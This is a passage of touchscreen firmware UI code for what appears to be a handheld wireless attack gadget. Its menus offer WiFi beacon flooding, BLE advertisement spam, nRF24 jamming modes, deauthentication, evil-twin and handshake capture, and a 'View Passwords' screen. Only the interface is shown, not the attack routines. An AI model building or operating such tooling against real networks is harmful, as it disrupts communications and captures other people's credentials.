  // Center both horizontally AND vertically
  int maskStartX = (240 - totalMaskWidth) / 2;
  int maskStartY = (320 - totalMaskHeight) / 2;
  
  char (*lines)[42] = new char[27][42];
  
  for (int i = 0; i < 27; i++) {
    for (int j = 0; j < 42; j++) {
      lines[i][j] = '\0';
    }
  }
  
  int lineIndex = 0;
  int charIndex = 0;
  int linePos = 0;
  
  while (lineIndex < 27) {
    char c = pgm_read_byte(&maskASCII[charIndex]);
    if (c == '\0') break;
    
    if (c == '\n') {
      lines[lineIndex][linePos] = '\0';
      lineIndex++;
      linePos = 0;
    } else if (linePos < 41) {
      lines[lineIndex][linePos++] = c;
    }
    charIndex++;
    if (charIndex > 2000) break;
  }
  
  if (lineIndex < 27 && linePos > 0) {
    lines[lineIndex][linePos] = '\0';
  }
  
  // Draw the skull
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < 41; x++) {
      char pixel = lines[y][x];
      
      if (pixel == 'c' || pixel == '\0') continue;
      
      int xPos = maskStartX + (x * pixelsPerChar);
      int yPos = maskStartY + (y * pixelsPerChar * 2);
      
      uint16_t color;
      if (pixel == 'h') color = COLOR_GREEN;
      else if (pixel == 'a') color = COLOR_DARK_GREEN;
      else if (pixel == 'k') color = COLOR_GREEN;
      else color = COLOR_GREEN;
      
      tft.fillRect(xPos, yPos, pixelsPerChar - 1, (pixelsPerChar * 2) - 2, color);
    }
  }
  
  delete[] lines;
}

void drawBeaconManager() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("beacon manager");
  
  const char* menuItems[] = {
    "Add Beacon",
    beaconFloodActive ? "Stop Flood" : "Start Flood"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 2; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Status
  y += 10;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Status: ");
  tft.setTextColor(beaconFloodActive ? COLOR_ORANGE : COLOR_GREEN);
  tft.printf(beaconFloodActive ? "FLOODING" : "STOPPED");
  
  y += 15;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Custom APs: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", customBeaconCount);
  
  // List of custom beacons
  y += 25;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Custom Beacon List:");
  y += 15;
  
  if (customBeaconCount == 0) {
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN + 5, y);
    tft.println("No custom beacons yet");
  } else {
    int displayCount = min(customBeaconCount - beaconDisplayOffset, MAX_DISPLAY_BEACONS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = beaconDisplayOffset + i;
      int itemY = y + (i * 22);
      
      // Beacon name
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN, itemY);
      String truncated = customBeacons[idx];
      if (truncated.length() > 25) truncated = truncated.substring(0, 24) + "~";
      tft.print(truncated);
      
      // Delete button indicator
      tft.setTextColor(COLOR_RED);
      tft.setCursor(200, itemY);
      tft.print("[X]");
    }
  }
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

String beaconInputSSID = "";
bool shiftActive = false;
bool symbolsActive = false;

// ==================== FIXED: drawBeaconAddScreen() ====================
void drawBeaconAddScreen() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("add beacon");
  
  // Input box
  int inputY = HEADER_HEIGHT + 10;
  int inputHeight = 40;
  tft.fillRect(SIDE_MARGIN, inputY, 240 - (2 * SIDE_MARGIN), inputHeight, COLOR_ITEM_BG);
  tft.drawRect(SIDE_MARGIN, inputY, 240 - (2 * SIDE_MARGIN), inputHeight, COLOR_MATRIX_GREEN);
  
  tft.setTextSize(2);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, inputY + 12);
  if (beaconInputSSID.length() > 0) {
    String display = beaconInputSSID;
    if (display.length() > 15) display = display.substring(0, 15);
    tft.print(display);
  } else {
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.print("Enter SSID...");
  }
  
  // Keyboard layout
  int keyY = inputY + inputHeight + 15;
  int keyW = 22;
  int keyH = 28;
  int keySpacing = 2;
  
  const char* keyboard_lower[4][10] = {
    {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"},
    {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
    {"a", "s", "d", "f", "g", "h", "j", "k", "l", " "},
    {"z", "x", "c", "v", "b", "n", "m", "_", "-", "."}
  };
  
  const char* keyboard_upper[4][10] = {
    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
    {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
    {"A", "S", "D", "F", "G", "H", "J", "K", "L", " "},
    {"Z", "X", "C", "V", "B", "N", "M", "_", "-", "."}
  };
  
  const char* keyboard_symbols[4][10] = {
    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
    {"[", "]", "{", "}", "<", ">", "|", "\\", "/", "?"},
    {"+", "=", "~", "`", ":", ";", "'", "\"", ",", " "},
    {".", "_", "-", " ", " ", " ", " ", " ", " ", " "}
  };
  
  const char* (*current_layout)[10];
  if (symbolsActive) {
    current_layout = keyboard_symbols;
  } else if (shiftActive) {
    current_layout = keyboard_upper;
  } else {
    current_layout = keyboard_lower;
  }
  
  // Draw keyboard
  for (int row = 0; row < 4; row++) {
    int keysInRow = (row < 3) ? 10 : 9;
    
    for (int col = 0; col < keysInRow; col++) {
      int x = SIDE_MARGIN + (col * (keyW + keySpacing));
      int y = keyY + (row * (keyH + keySpacing));
      
      tft.fillRect(x, y, keyW, keyH, COLOR_HEADER);
      tft.drawRect(x, y, keyW, keyH, COLOR_DARK_GREEN);
      
      tft.setTextSize(1);
      tft.setTextColor(COLOR_MATRIX_GREEN);
      
      int textX = x + (keyW / 2) - 3;
      int textY = y + (keyH / 2) - 4;
      
      tft.setCursor(textX, textY);
      tft.print(current_layout[row][col]);
    }
  }
  
  // ✅ FIXED: Control row - CENTERED
  int controlY = keyY + (4 * (keyH + keySpacing)) + 8;

  int shiftW = 45;
  int spaceW = 80;
  int symW = 50;
  int totalControlWidth = shiftW + 5 + spaceW + 5 + symW;
  int controlStartX = (240 - totalControlWidth) / 2;

  // SHIFT
  tft.fillRect(controlStartX, controlY, shiftW, 28, shiftActive ? COLOR_GREEN : COLOR_HEADER);
  tft.drawRect(controlStartX, controlY, shiftW, 28, COLOR_DARK_GREEN);
  tft.setTextSize(1);
  tft.setTextColor(shiftActive ? COLOR_BG : COLOR_MATRIX_GREEN);
  tft.setCursor(controlStartX + 6, controlY + 10);
  tft.print("SHIFT");

  // SPACE
  int spaceX = controlStartX + shiftW + 5;
  tft.fillRect(spaceX, controlY, spaceW, 28, COLOR_HEADER);
  tft.drawRect(spaceX, controlY, spaceW, 28, COLOR_DARK_GREEN);
  tft.setTextColor(COLOR_MATRIX_GREEN);
  tft.setCursor(spaceX + 22, controlY + 10);
  tft.print("SPACE");

  // SYM
  int symX = spaceX + spaceW + 5;
  tft.fillRect(symX, controlY, symW, 28, symbolsActive ? COLOR_CYAN : COLOR_HEADER);
  tft.drawRect(symX, controlY, symW, 28, COLOR_DARK_GREEN);
  tft.setTextColor(symbolsActive ? COLOR_BG : COLOR_MATRIX_GREEN);
  tft.setCursor(symX + 10, controlY + 10);
  tft.print("SYM");

  controlY += 36;

  // Match top-row width style: 45 - 80 - 50
  int delW = 45;
  int saveW = 80;
  int cancelW = 50;

  int totalActionWidth = delW + 5 + saveW + 5 + cancelW;
  int actionStartX = (240 - totalActionWidth) / 2;

  // DELETE (LEFT)
  tft.fillRect(actionStartX, controlY, delW, 28, COLOR_WARNING);
  tft.drawRect(actionStartX, controlY, delW, 28, COLOR_CRITICAL);
  tft.setTextSize(1);
  tft.setTextColor(COLOR_BG);
  tft.setCursor(actionStartX + 10, controlY + 10);
  tft.print("DEL");

  // SAVE (CENTER)
  int saveX = actionStartX + delW + 5;
  tft.fillRect(saveX, controlY, saveW, 28, COLOR_SUCCESS);
  tft.drawRect(saveX, controlY, saveW, 28, COLOR_MATRIX_GREEN);
  tft.setTextColor(COLOR_BG);
  tft.setCursor(saveX + 24, controlY + 10);
  tft.print("SAVE");

  // CANCEL (RIGHT)
  int cancelX = saveX + saveW + 5;
  tft.fillRect(cancelX, controlY, cancelW, 28, COLOR_CRITICAL);
  tft.drawRect(cancelX, controlY, cancelW, 28, COLOR_WARNING);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(cancelX + 6, controlY + 10);
  tft.print("CANCEL");
}

// ==================== FIXED: handleBeaconAddTouch() ====================
void handleBeaconAddTouch(int x, int y) {
  int inputY = HEADER_HEIGHT + 10;
  int inputHeight = 40;
  int keyY = inputY + inputHeight + 15;
  int keyW = 22;
  int keyH = 28;
  int keySpacing = 2;
  
  const char* keyboard_lower[4][10] = {
    {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"},
    {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
    {"a", "s", "d", "f", "g", "h", "j", "k", "l", " "},
    {"z", "x", "c", "v", "b", "n", "m", "_", "-", "."}
  };
  
  const char* keyboard_upper[4][10] = {
    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
    {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
    {"A", "S", "D", "F", "G", "H", "J", "K", "L", " "},
    {"Z", "X", "C", "V", "B", "N", "M", "_", "-", "."}
  };
  
  const char* keyboard_symbols[4][10] = {
    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
    {"[", "]", "{", "}", "<", ">", "|", "\\", "/", "?"},
    {"+", "=", "~", "`", ":", ";", "'", "\"", ",", " "},
    {".", "_", "-", " ", " ", " ", " ", " ", " ", " "}
  };
  
  const char* (*current_layout)[10];
  if (symbolsActive) {
    current_layout = keyboard_symbols;
  } else if (shiftActive) {
    current_layout = keyboard_upper;
  } else {
    current_layout = keyboard_lower;
  }
  
  // Check keyboard keys
  for (int row = 0; row < 4; row++) {
    int keysInRow = (row < 3) ? 10 : 9;
    
    for (int col = 0; col < keysInRow; col++) {
      int keyX = SIDE_MARGIN + (col * (keyW + keySpacing));
      int keyYPos = keyY + (row * (keyH + keySpacing));
      
      if (x >= keyX && x <= keyX + keyW && y >= keyYPos && y <= keyYPos + keyH) {
        if (beaconInputSSID.length() < 32) {
          beaconInputSSID += current_layout[row][col];
          drawBeaconAddScreen();
        }
        return;
      }
    }
  }
  
  // Control row checks - CENTERED positions
  int controlY = keyY + (4 * (keyH + keySpacing)) + 8;
  
  int shiftW = 45;
  int spaceW = 80;
  int symW = 50;
  int totalControlWidth = shiftW + 5 + spaceW + 5 + symW;
  int controlStartX = (240 - totalControlWidth) / 2;
  
  // SHIFT (left)
  if (x >= controlStartX && x <= controlStartX + shiftW && 
      y >= controlY && y <= controlY + 28) {
    shiftActive = !shiftActive;
    if (shiftActive) symbolsActive = false;
    drawBeaconAddScreen();
    return;
  }
  
  // SPACE (center)
  int spaceX = controlStartX + shiftW + 5;
  if (x >= spaceX && x <= spaceX + spaceW && 
      y >= controlY && y <= controlY + 28) {
    if (beaconInputSSID.length() < 32) {
      beaconInputSSID += " ";
      drawBeaconAddScreen();
    }
    return;
  }
  
  // SYMBOLS (right)
  int symX = spaceX + spaceW + 5;
  if (x >= symX && x <= symX + symW && 
      y >= controlY && y <= controlY + 28) {
    symbolsActive = !symbolsActive;
    if (symbolsActive) shiftActive = false;
    drawBeaconAddScreen();
    return;
  }
  
  // ✅ FIXED: Action buttons - CORRECT touch handling (matches display positions)
  controlY += 36;
  
  int delW = 45;
  int saveW = 80;
  int cancelW = 50;
  int totalActionWidth = delW + 5 + saveW + 5 + cancelW;
  int actionStartX = (240 - totalActionWidth) / 2;
  
  // DELETE (LEFT) - ✅ FIX: Now handles DELETE action
  if (x >= actionStartX && x <= actionStartX + delW && 
      y >= controlY && y <= controlY + 28) {
    if (beaconInputSSID.length() > 0) {
      beaconInputSSID.remove(beaconInputSSID.length() - 1);
      drawBeaconAddScreen();
    }
    return;
  }
  
  // SAVE (CENTER) - ✅ FIX: Now handles SAVE action
  int saveX = actionStartX + delW + 5;
  if (x >= saveX && x <= saveX + saveW && 
      y >= controlY && y <= controlY + 28) {
    if (beaconInputSSID.length() > 0 && customBeaconCount < 20) {
      customBeacons[customBeaconCount] = beaconInputSSID;
      customBeaconCount++;
      addToConsole("Added: " + beaconInputSSID);
      beaconInputSSID = "";
      shiftActive = false;
      symbolsActive = false;
      currentState = BEACON_MANAGER;
      drawBeaconManager();
    }
    return;
  }
  
  // CANCEL (RIGHT)
  int cancelX = saveX + saveW + 5;
  if (x >= cancelX && x <= cancelX + cancelW && 
      y >= controlY && y <= controlY + 28) {
    beaconInputSSID = "";
    shiftActive = false;
    symbolsActive = false;
    currentState = BEACON_MANAGER;
    drawBeaconManager();
    return;
  }
}

void deleteBeacon(int index) {
  if (index < 0 || index >= customBeaconCount) return;
  
  addToConsole("Deleted: " + customBeacons[index]);
  
  // Shift array
  for (int i = index; i < customBeaconCount - 1; i++) {
    customBeacons[i] = customBeacons[i + 1];
  }
  customBeaconCount--;
  
  // Adjust scroll if needed
  if (beaconDisplayOffset >= customBeaconCount && beaconDisplayOffset > 0) {
    beaconDisplayOffset -= MAX_DISPLAY_BEACONS;
    if (beaconDisplayOffset < 0) beaconDisplayOffset = 0;
  }
}

void drawBLEMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("bluetooth tools");
  
  const char* menuItems[] = {
    "Scan Bluetooth",
    "Advertisement Flood"  // ← Removed "Jammer"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 2; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Warning message
  y += 10;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("nRF24 = Real disconnect");
  tft.setCursor(SIDE_MARGIN, y + 12);
  tft.println("Spam = Popups only");
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

void drawBLEJammerMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("ble jammer");
  
  const char* menuItems[] = {
    bleJammerActive ? "Stop Jammer" : "Start Jammer"
  };
  
  int y = HEADER_HEIGHT + 10;
  drawMenuItem(menuItems[0], 0, y, hoveredIndex == 0, false);
  
  // Status section
  y = HEADER_HEIGHT + 50;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Status: ");
  tft.setTextColor(bleJammerActive ? COLOR_ORANGE : COLOR_TEXT);
  tft.printf(bleJammerActive ? "ACTIVE" : "STOPPED");
  
  y += 15;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Mode: ");
  tft.setTextColor(COLOR_GREEN);
  tft.println(jammerModeText);
  
  if (bleJammerActive) {
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Packets: ");
    tft.setTextColor(COLOR_CYAN);
    tft.printf("%d", bleJamPackets);
    
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Duration: ");
    tft.setTextColor(COLOR_TEXT);
    tft.printf("%d sec", (millis() - lastBLEJamTime) / 1000);
  }
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

void drawMoreToolsMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("security monitoring");
  
  const char* menuItems[] = {
    "Rogue AP Detector",
    "Deauth Detector",
    "Karma Detector",
    "AirTag Detector",
    "Wardriving"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 5; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Info section
  y += 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Security Monitoring Tools");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("• Detect attacks in real-time");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("• Identify malicious APs");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("• Monitor for threats");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("• Track network anomalies");
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("All passive monitoring - safe");
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

void drawAttackMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("attack mode");
  
  // Target display
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.print("Target: ");
  tft.setTextColor(COLOR_YELLOW);
  String displaySSID = selectedSSID;
  if (displaySSID.length() > 22) displaySSID = displaySSID.substring(0, 21) + "~";
  tft.println(displaySSID);
  
  // 6 MENU ITEMS
  const char* menuItems[] = {
    "Deauth (Standard)",
    "Deauth (Storm)",
    "Capture Handshake",
    "Evil Twin",
    "View Passwords",
    "Stop All"
  };
  
  int y = HEADER_HEIGHT + 25;
  for (int i = 0; i < 6; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // === SEPARATOR LINE ===
  int separatorY = y + 5;
  tft.drawFastHLine(0, separatorY, 240, COLOR_DARK_GREEN);
  
  // === STATUS SECTION REMOVED ===
  // updateAttackMenuLive() will handle all status drawing to prevent overlap
  
    drawCenteredButton("[ESC]", COLOR_RED);
}

void drawSpamMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("advertisement flood");
  
  const char* menuItems[] = {
    appleSpamActive ? "Stop Apple" : "Apple Spam",
    androidSpamActive ? "Stop Android" : "Android Spam",
    (appleSpamActive && androidSpamActive) ? "Stop Combined" : "Combined Spam"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 3; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Status section
  y = HEADER_HEIGHT + 100;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Apple status
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Apple: ");
  tft.setTextColor(appleSpamActive ? COLOR_ORANGE : COLOR_TEXT);
  tft.printf(appleSpamActive ? "ACTIVE" : "OFF");
  
  if (appleSpamActive) {
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN + 90, y);
    tft.printf("(%d)", appleSpamCount);
  }
  
  y += 15;
  
  // Android status
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Android: ");
  tft.setTextColor(androidSpamActive ? COLOR_ORANGE : COLOR_TEXT);
  tft.printf(androidSpamActive ? "ACTIVE" : "OFF");
  
  if (androidSpamActive) {
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN + 90, y);
    tft.printf("(%d)", androidSpamCount);
  }
  
  y += 20;
  
  // Packets per second
  if (appleSpamActive || androidSpamActive) {
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Rate: ");
    tft.setTextColor(COLOR_GREEN);
    
    unsigned long runtime = max(1UL, (millis() - lastAppleSpam) / 1000);
    uint32_t pps = (appleSpamCount + androidSpamCount) / runtime;
    tft.printf("~%d pkt/s", pps);
  }
  
  y += 25;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Info
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("AGGRESSIVE MODE:");
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("- 50 pkt/sec per type");
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("- Random MAC each packet");
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("- All device models");
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("- Combined = 100 pkt/sec!");
  
    drawCenteredButton("[ESC]", COLOR_RED);
}

void drawNRFJammerMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("nrf24 jam");
  
  // Updated menu items with mode selector
  const char* menuItems[] = {
    nrfJammerActive ? "Stop Jammer" : "Start Jammer",
    "Toggle Dual",
    "Cycle Mode"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 3; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Status section - COMPACT
  y = HEADER_HEIGHT + 100;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 8;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Mode: ");
  tft.setTextColor(dualNRFMode ? COLOR_GREEN : COLOR_PURPLE);
  tft.printf(dualNRFMode ? "DUAL (2x)" : "SINGLE");
  
  y += 12;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Pattern: ");
  
  // Show current jamming mode
  const char* modeName = "";
  uint16_t modeColor = COLOR_GREEN;
  switch (nrfJamMode) {
    case NRF_SWEEP:
      modeName = "SWEEP";
      modeColor = COLOR_GREEN;
      break;
    case NRF_RANDOM:
      modeName = "RANDOM";
      modeColor = COLOR_CYAN;
      break;
    case NRF_FOCUSED:
      modeName = "FOCUSED";
      modeColor = COLOR_ORANGE;
      break;
    case NRF_WIFI_CLOWN:
      modeName = "WIFI CLOWN";
      modeColor = COLOR_PURPLE;
      break;
  }
  tft.setTextColor(modeColor);
  tft.printf("%s", modeName);
  
  y += 12;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Radio 1: ");
  tft.setTextColor(nrf1Available ? COLOR_GREEN : COLOR_RED);
  tft.printf(nrf1Available ? "OK" : "FAIL");
  
  y += 12;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Radio 2: ");
  tft.setTextColor(nrf2Available ? COLOR_GREEN : COLOR_RED);
  tft.printf(nrf2Available ? "OK" : "FAIL");
  
  if (nrfJammerActive) {
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Status: ");
    tft.setTextColor(COLOR_ORANGE);
    tft.print("JAMMING");
    
    y += 12;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Packets: ");
    tft.setTextColor(COLOR_CYAN);
    tft.printf("%d", nrfJamPackets);
  }
  
  // Info box - Mode descriptions (ONE LINE EACH)
  y += 18;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 6;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("MODE GUIDE:");
  y += 11;
  
  // ===== MODE 1: SWEEP =====
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("SWEEP");
  tft.setTextColor(COLOR_TEXT);
  tft.print(" = ");
  tft.println("Smoochiee sweep pattern.");
  y += 11;
  
  // ===== MODE 2: RANDOM =====
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("RANDOM");
  tft.setTextColor(COLOR_TEXT);
  tft.print(" = ");
  tft.println("Chaotic channel hopping.");
  y += 11;
  
  // ===== MODE 3: FOCUSED =====
  tft.setTextColor(COLOR_ORANGE);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("FOCUSED");
  tft.setTextColor(COLOR_TEXT);
  tft.print(" = ");
  tft.println("BLE advertising only.");
  y += 11;
  
  // ===== MODE 4: WIFI CLOWN V2 (UPDATED) =====
  tft.setTextColor(COLOR_PURPLE);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("WIFI CLOWN");
  tft.setTextColor(COLOR_TEXT);
  tft.print(" = ");
  tft.println("WiFi Ch1,6,11 multi-sweep");
  
    drawCenteredButton("[ESC]", COLOR_RED);

}

void showConsole() {
  previousState = currentState;  // Save where we came from
  currentState = CONSOLE_VIEW;
  
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("console");
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  int y = HEADER_HEIGHT + 10;
  
  for (int i = 0; i < 15; i++) {
    int idx = (consoleIndex + i) % 15;
    if (consoleBuffer[idx].length() > 0) {
      tft.setCursor(5, y);
      
      // Color code based on content
      String msg = consoleBuffer[idx];
      if (msg.indexOf("ERROR") >= 0 || msg.indexOf("FAIL") >= 0) {
        tft.setTextColor(COLOR_RED);
      } else if (msg.indexOf("WARN") >= 0) {
        tft.setTextColor(COLOR_ORANGE);
      } else if (msg.indexOf("started") >= 0 || msg.indexOf("OK") >= 0) {
        tft.setTextColor(COLOR_GREEN);
      } else {
        tft.setTextColor(COLOR_TEXT);
      }
      
      String truncated = msg;
      if (truncated.length() > 38) {
        truncated = truncated.substring(0, 38);
      }
      tft.println("> " + truncated);
      y += 10;
      if (y > SCREEN_HEIGHT - 70) break;
    }
  }
  
    drawCenteredButton("[ESC]", COLOR_RED);
}

void handleSelectTargetTouch(int x, int y) {
  if (y > 300) {
    currentState = WIFI_MENU;
    hoveredIndex = -1;
    wifiScrollOffset = 0; // Reset scroll
    drawWiFiMenu();
    return;
  }
  
  int listY = HEADER_HEIGHT + 35;
  const int BACK_BUTTON_Y = 305;
  const int SAFE_BOTTOM = BACK_BUTTON_Y - 25;
  const int ITEM_HEIGHT = 28;
  const int MAX_ITEMS = (SAFE_BOTTOM - listY) / ITEM_HEIGHT;
  
  // Check if touch is in the list area
  if (y >= listY && y < SAFE_BOTTOM) {
    int clickedIndex = (y - listY) / ITEM_HEIGHT;
    int actualIndex = wifiScrollOffset + clickedIndex;
    
    if (actualIndex >= 0 && actualIndex < networkCount) {
      selectedSSID = networks[actualIndex].ssid;
      selectedIndex = actualIndex;
      currentState = WIFI_ATTACK_MENU;
      hoveredIndex = -1;
      wifiScrollOffset = 0; // Reset for next time
      drawAttackMenu();
      addToConsole("Target: " + selectedSSID);
    }
  }
  // Scroll functionality - tap scroll indicator area to go to next page
  else if (y >= SAFE_BOTTOM && y < 300 && networkCount > MAX_ITEMS) {
    // Calculate next page
    wifiScrollOffset += MAX_ITEMS;
    if (wifiScrollOffset >= networkCount) {
      wifiScrollOffset = 0; // Wrap to start
    }
    drawSelectTargetMenu();
  }
}

// Improved touch handling with better accuracy
void handleTouch() {
  uint16_t touchX, touchY;
  
  if (tft.getTouch(&touchX, &touchY)) {
    delay(150);
    
    uint16_t verifyX, verifyY;
    if (!tft.getTouch(&verifyX, &verifyY)) {
      return;
    }
    
    touchX = (touchX + verifyX) / 2;
    touchY = (touchY + verifyY) / 2;
    
    Serial.printf("Touch: X=%d, Y=%d, State=%d\n", touchX, touchY, currentState);
    
    // Route to handlers
    switch (currentState) {
      case MAIN_MENU:
        handleMainMenuTouch(touchX, touchY);
        break;
        
      case RF_MENU:
        handleRFMenuTouch(touchX, touchY);
        break;
        
      case RF_TYPE_MENU:
        handleRFTypeMenuTouch(touchX, touchY);
        break;
        
      case RF_MONITOR:
        handleRFMonitorTouch(touchX, touchY);
        break;
        
      case RF_CAPTURE:
        handleRFCaptureTouch(touchX, touchY);
        break;
        
      case RF_REPLAY:
        handleRFReplayTouch(touchX, touchY);
        break;
        
      case WIFI_MENU:
        handleWiFiMenuTouch(touchX, touchY);
        break;
        
      case WIFI_SCAN:
        handleWiFiScanTouch(touchX, touchY);
        break;
        
      case SELECT_TARGET:
        handleSelectTargetTouch(touchX, touchY);
        break;
        
      case WIFI_ATTACK_MENU:
        handleAttackMenuTouch(touchX, touchY);
        break;
        
      case BEACON_MANAGER:
        handleBeaconManagerTouch(touchX, touchY);
        break;
        
      case BEACON_ADD:
        handleBeaconAddTouch(touchX, touchY);
        break;

      case FRAME_SNIFFER_SUBMENU:
        handleFrameSnifferSubmenuTouch(touchX, touchY);
        break;

      case PROBE_SNIFFER_ACTIVE:
        handleProbeRequestSnifferTouch(touchX, touchY);
        break;

      case MGMT_SNIFFER_ACTIVE:
        handleManagementFrameSnifferTouch(touchX, touchY);
        break;

      case BEACON_ANALYZER_ACTIVE:
        handleBeaconAnalyzerTouch(touchX, touchY);
        break;

      case BLE_SNIFFER_ACTIVE:
        handleBLEFrameSnifferTouch(touchX, touchY);
        break;

      case SNIFFER_MENU:
        handleSnifferMenuTouch(touchX, touchY);
        break;

      case WIFI_SNIFFER_SUBMENU:  // ← NEW
